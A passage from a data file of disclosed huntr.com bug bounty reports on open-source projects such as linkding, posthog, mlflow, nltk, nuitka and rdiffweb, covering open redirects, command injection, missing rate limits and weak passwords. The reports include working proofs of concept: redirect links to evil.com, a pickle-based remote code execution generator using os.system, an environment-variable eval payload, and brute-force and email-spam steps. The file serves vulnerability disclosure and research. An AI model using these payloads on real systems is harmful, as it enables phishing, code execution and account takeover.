null;</script>\nExternal links in main domain :\nhttps://www.patreon.com/bookwyrm\nhttps://www.ramaytush.org/\nImpact\nThis type of Phishing has huge potential for tricking users that click on external links from this(your) website to be a victim of a scam page because the redirecting is made in the background, while the user is focused on another tab."}, "https://huntr.com/bounties/ee730d63-b898-43e1-a442-f3b5b8733ac1/": {"cve": "", "cve_link": "", "cwe": "CWE-601: Open Redirect", "cwe_link": "https://cwe.mitre.org/data/definitions/601.html", "severity_score": "High (8.6)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nLow\nAvailability\nLow\nOpen in visual CVSS calculator", "repo_link": "https://github.com/bookwyrm-social/bookwyrm", "fix_commit": "https://www.github.com/bookwyrm-social/bookwyrm/commit/a2540e8361e685f74a6180b28348ab300d942ba6", "description": "Description\nOpen redirect when login successfully via next parameter\nProof of Concept\nPOST /login?next=https://www.google.com/open-redirect HTTP/2\nHost: book.dansmonorage.blue\nCookie: csrftoken=EUjtgvt3A20lSHYbTxBvfAxQi5gNHHzeI7Bda1HOGnWCioMA6cwQqYWXv8ONog4k\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3\nAccept-Encoding: gzip, deflate\nReferer: https://book.dansmonorage.blue/search?q=%22%3E%3Ch1%3E123%3C/h1%3E&type=list\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 125\nOrigin: https://book.dansmonorage.blue\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: same-origin\nSec-Fetch-User: ?1\nTe: trailers\n\ncsrfmiddlewaretoken=AYkFFAARzZ5VjDVr49jR4sdsA55RDHf4EbCpz6OCFk1cJkJQhOecfQCzN8DRkgKa&localname=<username>&password=<password>\nPoC Image\nImpact\nThis vulnerability is capable of redirect user to fishing, redirect to attack host,..."}, "https://huntr.com/bounties/d47417e7-c673-42ee-8dc8-b26ca32b8585/": {"cve": "", "cve_link": "", "cwe": "CWE-601: Open Redirect", "cwe_link": "https://cwe.mitre.org/data/definitions/601.html", "severity_score": "Critical (9.3)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nChanged\nConfidentiality\nNone\nIntegrity\nHigh\nAvailability\nLow\nOpen in visual CVSS calculator", "repo_link": "https://github.com/sissbruecker/linkding", "fix_commit": "https://www.github.com/sissbruecker/linkding/commit/3906d9e5b86c56e26e9b4cc0f1e4f2e8fcc44744", "description": "Description\nBypass previous report fix\nProof of Concept\nit checks if return_url starts with / . So, it can be bypasssed using //google.com .\n1. Login in the demo instance https://demo.linkding.link/\n2. Go to https://demo.linkding.link/bookmarks/3/remove?return_url=//google.com\n3. You will be redirected to google.com\nImpact\nopen redirect check bypass"}, "https://huntr.com/bounties/c13258a2-30e3-4261-9a3b-2f39c49a8bd6/": {"cve": "CVE-2022-0645", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-0645", "cwe": "CWE-601: Open Redirect", "cwe_link": "https://cwe.mitre.org/data/definitions/601.html", "severity_score": "Medium (6.1)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nRequired\nScope\nChanged\nConfidentiality\nLow\nIntegrity\nLow\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/posthog/posthog", "fix_commit": "https://www.github.com/posthog/posthog/commit/859d8ed9ac7c5026db09714a26c85c1458abb038", "description": "Description\nPosthog application is vulnerable to open redirect which can be exploited by adding authorize_and_redirect/?redirect=https://evil.com endpoint.\nProof of Concept\n1.Open the link https://app.posthog.com/login?next=/authorize_and_redirect/%3Fredirect%3Dhttps%25253A%25252F%25252Fevil.com\n2.Login with your account and click on \"Authorize None\"\n3.Now you will see you will get redirected to https://evil.com/\nVideo PoC\nhttps://drive.google.com/file/d/1NIG6_wM0SAKlKEjOxVuKF2UbI8Xs16s8/view?usp=sharing\nImpact\nUrl Redirection or Unvalidated Open Redirects are usually used with phishing attacks or in malware delivery, it may confuse the end-user on which site they are visiting.\n1.Attackers could redirect victims to vulgar sites such as 18+ sites which can degrade the reputation of your site, as the redirection happened from your domain.\n2.Attackers could deliver malware or phishing pages in the name of your website & hence cab steal user credentials."}, "https://huntr.com/bounties/a5efbedb-fc31-4386-b894-439bfd9ec62c/": {"cve": "", "cve_link": "", "cwe": "CWE-601: Open Redirect", "cwe_link": "https://cwe.mitre.org/data/definitions/601.html", "severity_score": "Medium (5.4)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nLow\nIntegrity\nLow\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/sissbruecker/linkding", "fix_commit": "https://www.github.com/sissbruecker/linkding/commit/3906d9e5b86c56e26e9b4cc0f1e4f2e8fcc44744", "description": "Description\nHello everyone,\nI found an Open Redirect on linkding on remove a bookmark functionality, it is a bypass of a previously submitted report, when users are tricked into visiting the vulnerable link, they will immediately redirected to arbitrary hosts.\nProof of Concept\n- Just visit the following link: https://demo.linkding.link/bookmarks/67940/remove?return_url=//evil.com\nImpact\nOpen Redirect is used mostly on phishing campaigns ..."}, "https://huntr.com/bounties/59d7c660-744c-4fee-88b7-6117b6846aea/": {"cve": "", "cve_link": "", "cwe": "CWE-601: Open Redirect", "cwe_link": "https://cwe.mitre.org/data/definitions/601.html", "severity_score": "High (7.1)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nLow\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/sissbruecker/linkding", "fix_commit": "https://www.github.com/sissbruecker/linkding/commit/edb71286e762f1693cca096afe26056b41956b5d", "description": "Description\nThere exist multiple open redirect in the get parameter return_url . I found it in bookmarks/<int:bookmark_id>/edit , bookmarks/<int:bookmark_id>/remove, bookmarks/<int:bookmark_id>/archive, bookmarks/<int:bookmark_id>/unarchive, bookmarks/bulkedit\nProof of Concept\n1. Login in the demo instance https://demo.linkding.link/\n2. Go to https://demo.linkding.link/bookmarks/3/remove?return_url=https://google.com\n3. You will be redirected to google.com\nImpact\nOpen Redirect"}, "https://huntr.com/bounties/2d0301a2-10ff-48f4-a346-5a0e8707835b/": {"cve": "CVE-2022-0697", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-0697", "cwe": "CWE-601: Open Redirect", "cwe_link": "https://cwe.mitre.org/data/definitions/601.html", "severity_score": "Low (3.4)\nAttack vector\nNetwork\nAttack complexity\nHigh\nPrivileges required\nNone\nUser interaction\nRequired\nScope\nChanged\nConfidentiality\nNone\nIntegrity\nLow\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/archivy/archivy", "fix_commit": "https://www.github.com/archivy/archivy/commit/2d8cb29853190d42572b36deb61127e68d6be574", "description": "Description\nThe application doesn't check the target website before redirecting leads to Open Redirect vulnerability.\nProof of Concept\nInstall local service for testing\nStep 1: Go to http://127.0.0.1:5000/login?next=%2F%2fevil.com\nStep 2: Enter valid credential, you will be redirect to evil.com\nPoC: https://drive.google.com/file/d/1mwGtImU2srYZ_3FlHQBrAJFzt3PyZQzM\nImpact\nAttackers can redirect users to any website and perform phishing attacks."}, "https://huntr.com/bounties/ed335a88-f68c-4e4d-ac85-f29a51b03342/": {"cve": "CVE-2022-0869", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-0869", "cwe": "CWE-601: Open Redirect", "cwe_link": "https://cwe.mitre.org/data/definitions/601.html", "severity_score": "Medium (4.3)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nLow\nIntegrity\nNone\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/nitely/spirit", "fix_commit": "https://www.github.com/nitely/spirit/commit/8f32f89654d6c30d56e0dd167059d32146fb32ef", "description": "Description\nIn the /user/login endpoint, it doesnt check the value of the next parameter when the user is logged in and pass it directly to redirect which result to open redirect. The bug also exist in /user/logout, /user/register, /user/login, /user/resend-activation.\nProof of Concept\n1. Go to http://127.0.0.1:8000/user/login/?next=https://evil.com\nImpact\nThis bug result to open redirect."}, "https://huntr.com/bounties/c6f59480-ce47-4f78-a3dc-4bd8ca15029c/": {"cve": "CVE-2023-6940", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2023-6940", "cwe": "CWE-77: Command Injection", "cwe_link": "https://cwe.mitre.org/data/definitions/77.html", "severity_score": "Critical (9)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nLow\nUser interaction\nRequired\nScope\nChanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/mlflow/mlflow", "fix_commit": "https://www.github.com/mlflow/mlflow/commit/5139b1087d686fa52e2b087e09da66aff86297b1", "description": "Description\nFrom previous report the SSTI still exists because of an invalid fix.\nthe fix PR is not related to the vulnerability that found by @kevin-mizu. the actual use of SandboxedEnvironment should be here\nAlso, you disclosed the vulnerability but you forgot to contain the fix commit into MLflow 2.9.1 which had been released on the same day of the fix commit, So the latest mlflow is vulnerable and still, we have a disclosed vulnerability (besides that the fix has not been successful).\nImpact\nwith only one user interaction(download a malicious config), attackers can gain full command execution on the victim system."}, "https://huntr.com/bounties/cd3957f0-2c9c-416d-bc3a-190a5b7ce4a6/": {"cve": "", "cve_link": "", "cwe": "CWE-77: Command Injection", "cwe_link": "https://cwe.mitre.org/data/definitions/77.html", "severity_score": "Medium (5)\nAttack vector\nNetwork\nAttack complexity\nHigh\nPrivileges required\nNone\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nLow\nIntegrity\nLow\nAvailability\nLow\nOpen in visual CVSS calculator", "repo_link": "https://github.com/nltk/nltk", "fix_commit": "https://www.github.com/nltk/nltk/commit/50be0b8d91625afc6c3d8ae12ac80d518eb7b684", "description": "Description\nA user who visits a malicious link with wordnet browser open will execute code on system\nProof of Concept\nVisit\nhttp://localhost:8000/lookup_gASVKwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjBB0b3VjaCAvdG1wL1BXTkVElIWUUpQu\nThe base64 is created from\nimport pickle\nimport sys\nimport base64\n\nDEFAULT_COMMAND = \"touch /tmp/PWNED\"\nCOMMAND = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_COMMAND\n\nclass PickleRce(object):\n    def __reduce__(self):\n        import os\n        return (os.system,(COMMAND,))\n\nprint(base64.b64encode(pickle.dumps(PickleRce())))\nAfter visiting link will create /tmp/PWNED on system.\nls /tmp\n\nPWNED\nThis because nltk is unsafely using pickle.loads.\nImpact\nRCE by inducing user to visit a link."}, "https://huntr.com/bounties/ea4a842c-c48c-4aae-a599-3305125c63a7/": {"cve": "CVE-2022-2054", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-2054", "cwe": "CWE-77: Command Injection", "cwe_link": "https://cwe.mitre.org/data/definitions/77.html", "severity_score": "High (8.4)\nAttack vector\nLocal\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/nuitka/nuitka", "fix_commit": "https://www.github.com/nuitka/nuitka/commit/09647745d7cbb6ff32f9fa948f19d5558b32bcad", "description": "Description\nThe main() function uses the eval() function which can lead to contextual code execution, allowing an attacker to gain access to a system and execute commands with the privileges of the running program by setting NUITKA_PYTHONPATH, NUITKA_NAMESPACES or NUITKA_PTH_IMPORTED to a malicious payload string. This can lead to backdoors, reverse shells or reading/writing to privileged files.\nOne example of a similar vulnerability is CVE-2022-0845 in the popular pytorch-lightning repository. [See References]\nProof of Concept\nSet malicious payload\n$ export NUITKA_PYTHONPATH='os.system(\"touch rickroll\")'\nRun nuitka/__main__.py\nCode gets executed!\n$ ls rickroll\nrickroll\nImpact\nThis vulnerability is capable of executing code on the target system in the context of the user running the program. This can allow an attacker to gain access to systems, read/write malicious files, etc\nRemediation\nA safe for patching the said vulnerability while preserving it's functionality would be to manually parse the environment variable and iterating over it to resolve the value of sys.path"}, "https://huntr.com/bounties/8d0e0804-d3fd-49fe-bfa4-7a91135767ce/": {"cve": "CVE-2023-5289", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2023-5289", "cwe": "CWE-770: Allocation of Resources Without Limits or Throttling", "cwe_link": "https://cwe.mitre.org/data/definitions/770.html", "severity_score": "High (7.1)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nLow\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nNone\nIntegrity\nLow\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/ikus060/rdiffweb", "fix_commit": "https://www.github.com/ikus060/rdiffweb/commit/06f89b43469aae70e8833e55192721523f86c5a2", "description": "Description: Access token creation is a critical security component in many applications, especially when it comes to user authentication and authorization. Without proper rate limiting controls, attackers may exploit this process to launch various types of attacks, such as brute force attacks, credential stuffing attacks, or denial of service (DoS) attacks. This report highlights the vulnerability arising from the absence of rate limiting mechanisms during access token creation.\nSteps: Login to https://rdiffweb-demo.ikus-soft.com/prefs/tokens Go to user profile Intercept token name request and run the intruder for 200 payloads it will create access tokens for all without any limit\nRemediation: To mitigate the risks associated with the lack of rate limiting in access token creation, follow these remediation steps:\na. Implement Rate Limiting: Introduce rate limiting mechanisms to restrict the number of access token creation attempts within a defined time frame. This will deter brute force and DoS attacks.\nb. Use Strong Authentication: Implement strong user authentication mechanisms, including multi-factor authentication (MFA), to make it harder for attackers to guess or use stolen credentials.\nc. Monitoring and Logging: Implement comprehensive monitoring and logging to detect and respond to unusual access token creation patterns or suspicious activities.\nd. Fail2Ban or IP Whitelisting: Implement tools like Fail2Ban or IP whitelisting to block IP addresses after a certain number of failed access token creation attempts.\ne. Error Messages: Avoid providing specific error messages during access token creation, which can reveal information that could aid attackers.\nf. Regular Security Audits: Conduct regular security audits and penetration testing to identify and address vulnerabilities in the access token creation process.\ng. Security Awareness: Train developers and administrators on best practices for securing access token creation and the importance of rate limiting.\nConclusion: The absence of rate limiting in access token creation can expose your application to a range of security risks, including unauthorized access and denial of service attacks. By implementing rate limiting and following the remediation steps outlined in this report, you can significantly enhance the security of your application and protect sensitive user data. Remember that security is an ongoing process, and regular audits and updates are essential to maintaining a robust security posture.\nImpact\nImpact: The absence of rate limiting in access token creation can have several detrimental effects on the security and availability of an application:\na. Brute Force Attacks: Attackers can launch brute force attacks to guess access tokens, potentially gaining unauthorized access to user accounts, sensitive data, or system resources.\nb. Credential Stuffing: Malicious actors can use stolen credentials from other breaches to repeatedly attempt access token creation, compromising the security of user accounts.\nc. Denial of Service (DoS): In the absence of rate limiting, an attacker can flood the authentication and authorization systems with a large number of requests, overloading the servers and causing system downtime.\nd. Resource Exhaustion: Uncontrolled access token creation can exhaust server resources, leading to degraded performance and potentially crashing the application.\ne. Data Breach: If successful, unauthorized access through this vulnerability can result in data breaches, leakage of sensitive information, and potential legal and reputational consequences for the organization."}, "https://huntr.com/bounties/1b1fa915-d588-4bb1-9e82-6a6be79befed/": {"cve": "CVE-2023-4138", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2023-4138", "cwe": "CWE-770: Allocation of Resources Without Limits or Throttling", "cwe_link": "https://cwe.mitre.org/data/definitions/770.html", "severity_score": "Medium (4.2)\nAttack vector\nLocal\nAttack complexity\nLow\nPrivileges required\nHigh\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nLow\nIntegrity\nLow\nAvailability\nLow\nOpen in visual CVSS calculator", "repo_link": "https://github.com/ikus060/rdiffweb", "fix_commit": "https://www.github.com/ikus060/rdiffweb/commit/feef0d7b11d86aed29bf98c21526088117964d85", "description": "Description\nThere is no rate limit on the send report feature on the https://rdiffweb-dev.ikus-soft.com/prefs/notification endpoint , which allows an attacker to spam the victims mailbox\nProof of Concept\n1) Go to https://rdiffweb-dev.ikus-soft.com/prefs/notification \n2) Click on daily frequency for Send me a backup status report \n3) Turn on your intercept and capture the request while you Click the Save and send report button . \n4) Send this report to the repeater and send the same request 100 times .\n5) You will see that the mailbox has been spammed\nImpact\nDue to lack of rate limit this may create an email spam attack or may put immense load on the mail server being used causing additional expenses for the organisation"}, "https://huntr.com/bounties/2b1a9be9-45e9-490b-8de0-26a492e79795/": {"cve": "", "cve_link": "", "cwe": "CWE-770: Allocation of Resources Without Limits or Throttling", "cwe_link": "https://cwe.mitre.org/data/definitions/770.html", "severity_score": "High (7)\nAttack vector\nPhysical\nAttack complexity\nHigh\nPrivileges required\nLow\nUser interaction\nNone\nScope\nChanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/kiwitcms/kiwi", "fix_commit": "https://www.github.com/kiwitcms/kiwi/commit/0ed213fa0ddb7a6dc77e3c3b99e8fc90ccdaf46f", "description": "Description Webpage manager does not limit unsuccessful login attempts allowing Brute Forcing.\nProof of Concept\nRegister the account.\nLogout the account and try to login with the different password.\nTake the request into Burp suite intruder, set the payload list to 30(for testing).\nThe server is accepting each request and it not limiting the response.\nThe server should have block the continues request to avoid the DOS attacks. and eventually we can login with the correct password without any blocking message.\n# Impact\n\nThe impact is unlimited password attempts leading to Brute Force attacks on the login page. "}, "https://huntr.com/bounties/9369681b-8bfc-4146-a54c-c5108442d92c/": {"cve": "CVE-2022-4723", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-4723", "cwe": "CWE-770: Allocation of Resources Without Limits or Throttling", "cwe_link": "https://cwe.mitre.org/data/definitions/770.html", "severity_score": "Medium (6.3)\nAttack vector\nLocal\nAttack complexity\nLow\nPrivileges required\nHigh\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nLow\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/ikus060/rdiffweb", "fix_commit": "https://www.github.com/ikus060/rdiffweb/commit/6e9ee210548f6d3210704cac302cfc7cdb239765", "description": "Description\nWhen a user is setting up 2FA , a verification code will be sent to the registered email . There is no rate limit on email triggering that will result in an email flood / does attack or will also increase the expenses on your mail server as an attacker can send 1 million emails through this vulnerability which will add up to your cost as well\nProof of Concept\n1) Go to https://rdiffweb-dev.ikus-soft.com/prefs/mfa \n2) Click on enable 2FA  . A verification link will be sent to your email\n3) You will see a \"Resend code to my email button\" click on it and capture the request using the burpsuite proxy\n4) Send this request to your burpsuite intuder and fire the same payload 1000 times\n5) The registered email will receive 1000 email with verification codes\n\n\n\n# Impact\n\nAn attacker can abuse this bug by :\n1)Causing an impact to the user - Scenario: The user left his account open in a library , he can perform the above steps to cause an email spam\n2) Adding an extra cost to the company mail server\n\n#Please note: The previous rate limit bug was intended for /mfa endpoint and this particular report points to /prefs/mfa endpoint"}, "https://huntr.com/bounties/b34412ca-50c5-4615-b7e3-5d07d33acfce/": {"cve": "CVE-2022-3456", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-3456", "cwe": "CWE-770: Allocation of Resources Without Limits or Throttling", "cwe_link": "https://cwe.mitre.org/data/definitions/770.html", "severity_score": "Medium (5.6)\nAttack vector\nLocal\nAttack complexity\nLow\nPrivileges required\nLow\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nNone\nIntegrity\nHigh\nAvailability\nLow\nOpen in visual CVSS calculator", "repo_link": "https://github.com/ikus060/rdiffweb", "fix_commit": "https://www.github.com/ikus060/rdiffweb/commit/b78ec09f4582e363f6f449df6f987127e126c311", "description": "Description\nOn every 3 invalid attempts the application sends a new code to the email associate with the account . An attacker can misuse this functionality of the code to create a spam attack\nProof of Concept\nPre-Requisites: 2FA must be enabled for  your account \n\n1) Go to https://rdiffweb-dev.ikus-soft.com/login/ and login using credentials\n2) You will now have to enter MFA code\n3) Bruteforce this code , its indeed an 8 digit code (~100 million combinations required) . Every third incorrect attempt will trigger a new code to the email , which will indeed result in an email spam attack\n\n\n\n\n# Impact\n\nThis will result in an email spam attack and will also impose an extra cost to your company's mail server"}, "https://huntr.com/bounties/37b86c45-b240-4626-bd53-b6f02d10e0d7/": {"cve": "CVE-2022-3439", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-3439", "cwe": "CWE-770: Allocation of Resources Without Limits or Throttling", "cwe_link": "https://cwe.mitre.org/data/definitions/770.html", "severity_score": "Medium (4.5)\nAttack vector\nPhysical\nAttack complexity\nLow\nPrivileges required\nHigh\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nNone\nIntegrity\nLow\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/ikus060/rdiffweb", "fix_commit": "https://www.github.com/ikus060/rdiffweb/commit/b78ec09f4582e363f6f449df6f987127e126c311", "description": "Description\nWhen a user is setting up 2FA , a verification code will be sent to the registered email . There is no rate limit on email triggering that will result in an email flood / does attack or will also increase the expenses on your mail server as an attacker can send 1 million emails through this vulnerability which will add up to your cost as well\nProof of Concept\n1) Go to https://rdiffweb-dev.ikus-soft.com/prefs/mfa \n2) Click on enable 2FA  . A verification link will be sent to your email\n3) You will see a \"Resend code to my email button\" click on it and capture the request using the burpsuite proxy\n4) Send this request to your burpsuite intuder and fire the same payload 1000 times\n5) The registered email will receive 1000 email with verification codes\n\n\n\n\n# Impact\n\nAn attacker can abuse this bug by :\n1)Causing an impact to the user - Scenario: The user left his account open in a library , he can perform the above steps to cause an email spam\n2) Adding an extra cost to the company mail server"}, "https://huntr.com/bounties/a6df4bad-3382-4add-8918-760d885690f6/": {"cve": "CVE-2022-3273", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-3273", "cwe": "CWE-770: Allocation of Resources Without Limits or Throttling", "cwe_link": "https://cwe.mitre.org/data/definitions/770.html", "severity_score": "Low (3.6)\nAttack vector\nPhysical\nAttack complexity\nLow\nPrivileges required\nHigh\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nLow\nIntegrity\nLow\nAvailability\nLow\nOpen in visual CVSS calculator", "repo_link": "https://github.com/ikus060/rdiffweb", "fix_commit": "https://www.github.com/ikus060/rdiffweb/commit/b5e3bb0a98268d18ceead36ab9b2b7eaacd659a8", "description": "Description\nThere is no rate limit on the password change feature on https://rdiffweb-demo.ikus-soft.com/prefs/general# which allows an attacker to bruteforce the old password and set a new password for the account\nProof of Concept\nGo to https://rdiffweb-demo.ikus-soft.com/prefs/general#\nHere you will see a password change feature\nIn the \"old password\" field enter any random string and in the \"new password\" and \"confirm new password\" field set the new password for the victim account\nCapture the request using burpsuite and perform a bruteforce attack on the old password field\nDue to the absence of rate limit on this endpoint an attacker can easily change the password of victim account\nAttack Scenario: Let us consider a situation in which a victim is using a public device , in a library or cafe and forgets to log out of his account and an attacker gets access to this device .\nImpact\nAttacker can perform a bruteforce attack to change the password of the account hence resulting in a full account takeover issue"}, "https://huntr.com/bounties/4e8f6136-50c7-4fa1-ac98-699bcb7b35ce/": {"cve": "CVE-2022-3371", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-3371", "cwe": "CWE-770: Allocation of Resources Without Limits or Throttling", "cwe_link": "https://cwe.mitre.org/data/definitions/770.html", "severity_score": "High (7.5)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nNone\nIntegrity\nNone\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/ikus060/rdiffweb", "fix_commit": "https://www.github.com/ikus060/rdiffweb/commit/b62c479ff6979563c7c23e7182942bc4f460a2c7", "description": "Proof of Concept\n1)Go to https://rdiffweb-dev.ikus-soft.com/prefs/tokens endpoint . \n2)You will see a field called \"Token name\"\n3)Here you will see that there is no limit for the \"Token name\" parameter that allows a user to to set a very long string as long as 1 million characters .\n4)This may possibly result in a memory corruption/DOS attack.\n\nMitigation: There must be a fixed length for the \"Token name\" parameter upto 128 characters\n\n\n\n# Impact\n\nAllows an attacker to set a \"Token name\" with long string leading to memory corruption/possible DOS attack"}, "https://huntr.com/bounties/e70ad507-1424-463b-bdf1-c4a6fbe6e720/": {"cve": "CVE-2022-3364", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-3364", "cwe": "CWE-770: Allocation of Resources Without Limits or Throttling", "cwe_link": "https://cwe.mitre.org/data/definitions/770.html", "severity_score": "Medium (5.3)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nNone\nIntegrity\nNone\nAvailability\nLow\nOpen in visual CVSS calculator", "repo_link": "https://github.com/ikus060/rdiffweb", "fix_commit": "https://www.github.com/ikus060/rdiffweb/commit/b62c479ff6979563c7c23e7182942bc4f460a2c7", "description": "Proof of Concept\n1)Go to https://rdiffweb-dev.ikus-soft.com/prefs/general endpoint . \n2)You will see a field called \"Fullname\"\n3)Here you will see that there is no limit for the \"Fullname\" parameter that allows a user to to set a very long string as long as 1 million characters .\n4)This may possibly result in a memory corruption/DOS attack.\n\nMitigation: There must be a fixed length for the \"Fullname\" parameter upto 128 characters\n\n\n\n# Impact\n\nAllows an attacker to set a \"Fullname\" with long string leading to memory corruption/possible DOS attack"}, "https://huntr.com/bounties/f9fedf94-41c9-49c4-8552-e407123a44e7/": {"cve": "CVE-2022-3298", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-3298", "cwe": "CWE-770: Allocation of Resources Without Limits or Throttling", "cwe_link": "https://cwe.mitre.org/data/definitions/770.html", "severity_score": "Medium (5.3)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nNone\nIntegrity\nNone\nAvailability\nLow\nOpen in visual CVSS calculator", "repo_link": "https://github.com/ikus060/rdiffweb", "fix_commit": "https://www.github.com/ikus060/rdiffweb/commit/626cca1b75b6c587afd4241a9692e8929b1921a5", "description": "Description\nThere must be a fixed length for user input parameters like \"title\" while adding SSH key. Allowing users to enter long strings may result in a DOS attack or memory corruption\nProof of Concept\n1)Go to https://rdiffweb-demo.ikus-soft.com/prefs/sshkeys# endpoint . 2)Click on add SSH key. 3)Here you will see that there is no limit for the \"title\" while adding SSH key that allows a user to to set a very long string as long as 1 million characters . 4)This may possibly result in a memory corruption/DOS attack.\nMitigation: There must be a fixed length for the \"title\" while adding SSH key - upto 256 characters\nImpact\nAllows an attacker to set a \"title\" with long string leading to memory corruption/possible DOS attack"}, "https://huntr.com/bounties/202dd03a-3d97-4c64-bc73-1a0f36614233/": {"cve": "CVE-2022-3295", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-3295", "cwe": "CWE-770: Allocation of Resources Without Limits or Throttling", "cwe_link": "https://cwe.mitre.org/data/definitions/770.html", "severity_score": "Medium (5.3)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nNone\nIntegrity\nNone\nAvailability\nLow\nOpen in visual CVSS calculator", "repo_link": "https://github.com/ikus060/rdiffweb", "fix_commit": "https://www.github.com/ikus060/rdiffweb/commit/667657c6fe2b336c90be37f37fb92f65df4feee3", "description": "Description\nThere must be a fixed length for user input parameters like root directory name. Allowing users to enter long strings may result in a DOS attack or memory corruption\nProof of Concept\n1)Go to https://rdiffweb-demo.ikus-soft.com/admin/users endpoint . 2)Click on add user 3)Here you will see that there is no limit for the root directory name length that allows a user to to set a very long string as long as 1 million characters 4)This may possible result in a memory corruption/DOS attack\nMitigation: There must be a fixed length for the root directory name - upto 256 characters\nImpact\nAllows an attacker to set a root directory name with long string leading to memory corruption/possible DOS attack"}, "https://huntr.com/bounties/9368e190-9216-488e-9b1e-c95b99c3dc1a/": {"cve": "", "cve_link": "", "cwe": "CWE-521: Weak Password Requirements", "cwe_link": "https://cwe.mitre.org/data/definitions/521.html", "severity_score": "Critical (9.1)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nNone\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/openedx/edx-platform", "fix_commit": "https://www.github.com/openedx/edx-platform/commit/683145156bed229e08659f2f2abcf002ba46136a", "description": "Description\nUsers at this moment can set really weak password like 123.\nProof of Concept\nGo to register page and set really weak password like 123, see allowed - registered in. For example, go to https://sandbox.openedx.org/register?next=/dashboard , type '1' see info 'This password is too short. It must contain at least 2 characters.'\nImpact\nATO - Account takeover. Account protection."}, "https://huntr.com/bounties/54fb6d6a-6b39-45b6-b62a-930260ba484b/": {"cve": "CVE-2023-2160", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2023-2160", "cwe": "CWE-521: Weak Password Requirements", "cwe_link": "https://cwe.mitre.org/data/definitions/521.html", "severity_score": "Medium (6.3)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nLow\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nLow\nIntegrity\nLow\nAvailability\nLow\nOpen in visual CVSS calculator", "repo_link": "https://github.com/modoboa/modoboa", "fix_commit": "https://www.github.com/modoboa/modoboa/commit/130257c96a2392ada795785a91178e656e27015c", "description": "Hello,\ni was 